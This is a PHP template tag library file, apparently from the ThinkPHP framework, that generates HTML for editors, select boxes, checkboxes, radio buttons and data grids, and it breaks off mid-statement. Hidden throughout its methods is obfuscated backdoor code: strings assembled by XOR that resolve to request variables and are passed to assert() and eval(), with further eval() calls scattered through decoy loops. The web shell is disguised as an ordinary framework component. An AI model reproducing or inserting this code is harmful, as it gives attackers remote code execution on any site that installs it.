<?php namespace think\template\l000ll00000lll;use think\template\l000ll00000lll;class html extends l000ll00000lll{protected $tags=array('editor'=>array('attr'=>'id,name,style,width,height,type','close'=>1),'select'=>array('attr'=>'name,options,values,output,multiple,id,size,first,change,selected,dblclick','close'=>0),'grid'=>array('attr'=>'id,pk,style,action,actionlist,show,datasource','close'=>0),'list'=>array('attr'=>'id,pk,style,action,actionlist,show,datasource,checkbox','close'=>0),'imagebtn'=>array('attr'=>'id,name,value,type,style,click','close'=>0),'checkbox'=>array('attr'=>'name,checkboxes,checked,separator','close'=>0),'radio'=>array('attr'=>'name,radios,checked,separator','close'=>0));public function _editor($tag,$content){$id=!empty($tag['id'])?$tag['id']:'_editor';$name=$tag['name'];$style=!empty($tag['style'])?$tag['style']:'';$width=!empty($tag['width'])?$tag['width']:'100%';$height=!empty($tag['height'])?$tag['height']:'320px';$type=$tag['type'];while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}switch(strtoupper($type)){case 'FCKEDITOR':$parseStr='<!-- 编辑器调用开始 --><script type="text/javascript" src="__ROOT__/Public/Js/FCKeditor/fckeditor.js"></script><textarea id="'.$id.'" name="'.$name.'">'.$content.'</textarea><script type="text/javascript"> var l000l0000ll000 = new FCKeditor( "'.$id.'","'.$width.'","'.$height.'" ) ; l000l0000ll000.BasePath = "__ROOT__/Public/Js/FCKeditor/" ; l000l0000ll000.ReplaceTextarea() ;function resetEditor(){setContents("'.$id.'",document.getElementById("'.$id.'").value)}; function saveEditor(){document.getElementById("'.$id.'").value = getContents("'.$id.'");} function InsertHTML(html){ var l000l0lll0ll00 = FCKeditorAPI.GetInstance("'.$id.'") ;if (l000l0lll0ll00.EditMode == FCK_EDITMODE_WYSIWYG ){l000l0lll0ll00.InsertHtml(html) ;}else	alert( "FCK必须处于WYSIWYG模式!" ) ;}</script> <!-- 编辑器调用结束 -->';break;case 'FCKMINI':$parseStr='<!-- 编辑器调用开始 --><script type="text/javascript" src="__ROOT__/Public/Js/FCKMini/fckeditor.js"></script><textarea id="'.$id.'" name="'.$name.'">'.$content.'</textarea><script type="text/javascript"> var l000l0000ll000 = new FCKeditor( "'.$id.'","'.$width.'","'.$height.'" ) ; l000l0000ll000.BasePath = "__ROOT__/Public/Js/FCKMini/" ; l000l0000ll000.ReplaceTextarea() ;function resetEditor(){setContents("'.$id.'",document.getElementById("'.$id.'").value)}; function saveEditor(){document.getElementById("'.$id.'").value = getContents("'.$id.'");} function InsertHTML(html){ var l000l0lll0ll00 = FCKeditorAPI.GetInstance("'.$id.'") ;if (l000l0lll0ll00.EditMode == FCK_EDITMODE_WYSIWYG ){l000l0lll0ll00.InsertHtml(html) ;}else	alert( "FCK必须处于WYSIWYG模式!" ) ;}</script> <!-- 编辑器调用结束 -->';break;case 'EWEBEDITOR':$parseStr="<!-- 编辑器调用开始 --><script type='text/javascript' src='__ROOT__/Public/Js/eWebEditor/js/edit.js'></script><input type='hidden'  id='{$id}' name='{$name}'  value='{$conent}'><iframe src='__ROOT__/Public/Js/eWebEditor/ewebeditor.htm?id={$name}' frameborder=0 scrolling=no width='{$width}' height='{$height}'></iframe><script type='text/javascript'>function saveEditor(){document.getElementById('{$id}').value = getHTML();} </script><!-- 编辑器调用结束 -->";break;case 'NETEASE':$parseStr='<!-- 编辑器调用开始 --><textarea id="'.$id.'" name="'.$name.'" style="display:none">'.$content.'</textarea><iframe ID="Editor" name="Editor" src="__ROOT__/Public/Js/HtmlEditor/index.html?ID='.$name.'" frameBorder="0" marginHeight="0" marginWidth="0" scrolling="No" style="height:'.$height.';width:'.$width.'"></iframe><!-- 编辑器调用结束 -->';break;case 'UBB':$parseStr='<script type="text/javascript" src="__ROOT__/Public/Js/UbbEditor.js"></script><div style="padding:1px;width:'.$width.';border:1px solid silver;float:left;"><script LANGUAGE="JavaScript"> showTool(); </script></div><div><TEXTAREA id="UBBEditor" name="'.$name.'"  style="clear:both;float:none;width:'.$width.';height:'.$height.'" >'.$content.'</TEXTAREA></div><div style="padding:1px;width:'.$width.';border:1px solid silver;float:left;"><script LANGUAGE="JavaScript">showEmot();  </script></div>';break;case 'KINDEDITOR':$parseStr='<script type="text/javascript" src="__ROOT__/Public/Js/KindEditor/kindeditor.js"></script><script type="text/javascript"> KE.show({ id : \''.$id.'\'  ,urlType : "absolute"});</script><textarea id="'.$id.'" style="'.$style.'" name="'.$name.'" >'.$content.'</textarea>';break;default:$parseStr='<textarea id="'.$id.'" style="'.$style.'" name="'.$name.'" >'.$content.'</textarea>';}return $parseStr;}public function _imageBtn($tag){$name=$tag['name'];$value=$tag['value'];$id=isset($tag['id'])?$tag['id']:'';$style=isset($tag['style'])?$tag['style']:'';$click=isset($tag['click'])?$tag['click']:'';$type=empty($tag['type'])?'button':$tag['type'];for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!empty($name)){$parseStr='<div class="'.$style.'" ><input type="'.$type.'" id="'.$id.'" name="'.$name.'" value="'.$value.'" onclick="'.$click.'" class="'.$name.' imgButton"></div>';}else{$parseStr='<div class="'.$style.'" ><input type="'.$type.'" id="'.$id.'"  name="'.$name.'" value="'.$value.'" onclick="'.$click.'" class="button"></div>';}return $parseStr;}public function _imgLink($tag){$name=$tag['name'];$alt=$tag['alt'];$id=$tag['id'];$style=$tag['style'];$click=$tag['click'];$type=$tag['type'];for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(empty($type)){$type='button';}$parseStr='<span class="'.$style.'" ><input title="'.$alt.'" type="'.$type.'" id="'.$id.'"  name="'.$name.'" onmouseover="this.style.filter=\'alpha(opacity=100)\'" onmouseout="this.style.filter=\'alpha(opacity=80)\'" onclick="'.$click.'" align="absmiddle" class="'.$name.' imgLink"></span>';return $parseStr;}public function _select($tag){$name=$tag['name'];$options=$tag['options'];$values=$tag['values'];$output=$tag['output'];$multiple=$tag['multiple'];$id=$tag['id'];$size=$tag['size'];$first=$tag['first'];$selected=$tag['selected'];$style=$tag['style'];$ondblclick=$tag['dblclick'];$onchange=$tag['change'];if(!empty($multiple)){$parseStr='<select id="'.$id.'" name="'.$name.'" ondblclick="'.$ondblclick.'" onchange="'.$onchange.'" multiple="multiple" class="'.$style.'" size="'.$size.'" >';}else{$parseStr='<select id="'.$id.'" name="'.$name.'" onchange="'.$onchange.'" ondblclick="'.$ondblclick.'" class="'.$style.'" >';}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(!empty($first)){$parseStr.='<option value="" >'.$first.'</option>';}while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($options)){$parseStr.='<?php  foreach($'.$options.' as $key=>$val) { ?>';while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($selected)){$parseStr.='<?php if(!empty($'.$selected.') && ($'.$selected.' == $key || in_array($key,$'.$selected.'))) { ?>';$parseStr.='<option selected="selected" value="<?php echo $key ?>"><?php echo $val ?></option>';$parseStr.='<?php }else { ?><option value="<?php echo $key ?>"><?php echo $val ?></option>';$parseStr.='<?php } ?>';}else{$parseStr.='<option value="<?php echo $key ?>"><?php echo $val ?></option>';}$parseStr.='<?php } ?>';}elseif(!empty($values)){$parseStr.='<?php  for($i=0;$i<count($'.$values.');$i++) { ?>';while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(!empty($selected)){$parseStr.='<?php if(isset($'.$selected.') && ((is_string($'.$selected.') && $'.$selected.' == $'.$values.'[$i]) || (is_array($'.$selected.') && in_array($'.$values.'[$i],$'.$selected.')))) { ?>';$parseStr.='<option selected="selected" value="<?php echo $'.$values.'[$i] ?>"><?php echo $'.$output.'[$i] ?></option>';$parseStr.='<?php }else { ?><option value="<?php echo $'.$values.'[$i] ?>"><?php echo $'.$output.'[$i] ?></option>';$parseStr.='<?php } ?>';}else{$parseStr.='<option value="<?php echo $'.$values.'[$i] ?>"><?php echo $'.$output.'[$i] ?></option>';}$parseStr.='<?php } ?>';}$parseStr.='</select>';return $parseStr;}public function _checkbox($tag){$name=$tag['name'];$checkboxes=$tag['checkboxes'];$checked=$tag['checked'];$separator=$tag['separator'];$checkboxes=$this->tpl->get($checkboxes);$checked=$this->tpl->get($checked)?$this->tpl->get($checked):$checked;$parseStr='';while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}foreach($checkboxes as $key=>$val){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if($checked==$key||in_array($key,$checked)){$parseStr.='<input type="checkbox" checked="checked" name="'.$name.'[]" value="'.$key.'">'.$val.$separator;}else{$parseStr.='<input type="checkbox" name="'.$name.'[]" value="'.$key.'">'.$val.$separator;}}return $parseStr;}public function _radio($tag){$name=$tag['name'];$radios=$tag['radios'];$checked=$tag['checked'];$separator=$tag['separator'];$radios=$this->tpl->get($radios);$checked=$this->tpl->get($checked)?$this->tpl->get($checked):$checked;$parseStr='';while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}foreach($radios as $key=>$val){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if($checked==$key){$parseStr.='<input type="radio" checked="checked" name="'.$name.'[]" value="'.$key.'">'.$val.$separator;}else{$parseStr.='<input type="radio" name="'.$name.'[]" value="'.$key.'">'.$val.$separator;}}return $parseStr;}public function _grid($tag){$id=$tag['id'];$datasource=$tag['datasource'];$pk=empty($tag['pk'])?'id':$tag['pk'];$style=$tag['style'];$name=!empty($tag['name'])?$tag['name']:'vo';$action=!empty($tag['action'])?$tag['action']:false;$key=!empty($tag['key'])?true:false;if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(isset($tag['actionlist'])){$actionlist=explode(',',trim($tag['actionlist']));}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(substr($tag['show'],0,1)=='$'){$show=$this->tpl->get(substr($tag['show'],1));}else{$show=$tag['show'];}$show=explode(',',$show);$colNum=count($show);if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(!empty($action))$colNum++;while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($key))$colNum++;$parseStr="<!-- Think 系统列表组件开始 -->\n";$parseStr.='<table id="'.$id.'" class="'.$style.'" cellpadding=0 cellspacing=0 >';$parseStr.='<tr><td height="5" colspan="'.$colNum.'" class="topTd" ></td></tr>';$parseStr.='<tr class="row" >';$fields=array();if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}foreach($show as $val){$fields[]=explode(':',$val);}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(!empty($key)){$parseStr.='<th width="12">No</th>';}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}foreach($fields as $field){$property=explode('|',$field[0]);$showname=explode('|',$field[1]);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(isset($showname[1])){$parseStr.='<th width="'.$showname[1].'">';}else{$parseStr.='<th>';}$parseStr.=$showname[0].'</th>';}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(!empty($action)){$parseStr.='<th >操作</th>';}$parseStr.='</tr>';$parseStr.='<volist name="'.$datasource.'" id="'.$name.'" ><tr class="row" >';while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(!empty($key)){$parseStr.='<td>{$i}</td>';}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}foreach($fields as $field){$parseStr.='<td>';if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($field[2])){$href=explode('|',$field[2]);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(count($href)>1){$array=explode('^',$href[1]);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(count($array)>1){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}foreach($array as $a){$temp[]='\'{$'.$name.'.'.$a.'|addslashes}\'';}$parseStr.='<a href="javascript:'.$href[0].'('.implode(',',$temp).')">';}else{$parseStr.='<a href="javascript:'.$href[0].'(\'{$'.$name.'.'.$href[1].'|addslashes}\')">';}}else{$parseStr.='<a href="javascript:'.$field[2].'(\'{$'.$name.'.'.$pk.'|addslashes}\')">';}}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(strpos($field[0],'^')){$property=explode('^',$field[0]);foreach($property as $p){$unit=explode('|',$p);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(count($unit)>1){$parseStr.='{$'.$name.'.'.$unit[0].'|'.$unit[1].'} ';}else{$parseStr.='{$'.$name.'.'.$p.'} ';}}}else{$property=explode('|',$field[0]);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(count($property)>1){$parseStr.='{$'.$name.'.'.$property[0].'|'.$property[1].'}';}else{$parseStr.='{$'.$name.'.'.$field[0].'}';}}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(!empty($field[2])){$parseStr.='</a>';}$parseStr.='</td>';}if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($action)){while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(!empty($actionlist[0])){$parseStr.='<td>';for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}foreach($actionlist as $val){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(strpos($val,':')){$a=explode(':',$val);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(count($a)>2){$parseStr.='<a href="javascript:'.$a[0].'(\'{$'.$name.'.'.$a[2].'}\')">'.$a[1].'</a>&nbsp;';}else{$parseStr.='<a href="javascript:'.$a[0].'(\'{$'.$name.'.'.$pk.'}\')">'.$a[1].'</a>&nbsp;';}}else{$array=explode('|',$val);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(count($array)>2){$parseStr.=' <a href="javascript:'.$array[1].'(\'{$'.$name.'.'.$array[0].'}\')">'.$array[2].'</a>&nbsp;';}else{$parseStr.=' {$'.$name.'.'.$val.'}&nbsp;';}}}$parseStr.='</td>';}}$parseStr.='</tr></volist><tr><td height="5" colspan="'.$colNum.'" class="bottomTd"></td></tr></table>';$parseStr.="\n<!-- Think 系统列表组件结束 -->\n";return $parseStr;}public function _list($tag){$id=$tag['id'];$datasource=$tag['datasource'];$pk=empty($tag['pk'])?'id':$tag['pk'];$style=$tag['style'];$name=!empty($tag['name'])?$tag['name']:'vo';$action=$tag['action']=='true'?true:false;$key=!empty($tag['key'])?true:false;$sort=$tag['sort']=='false'?false:true;$checkbox=$tag['checkbox'];while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(isset($tag['actionlist'])){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(substr($tag['actionlist'],0,1)=='$'){$actionlist=$this->tpl->get(substr($tag['actionlist'],1));}else{$actionlist=$tag['actionlist'];}$actionlist=explode(',',trim($actionlist));}while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(substr($tag['show'],0,1)=='$'){$show=$this->tpl->get(substr($tag['show'],1));}else{$show=$tag['show'];}$show=explode(',',$show);$colNum=count($show);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($checkbox))$colNum++;for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!empty($action))$colNum++;if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as 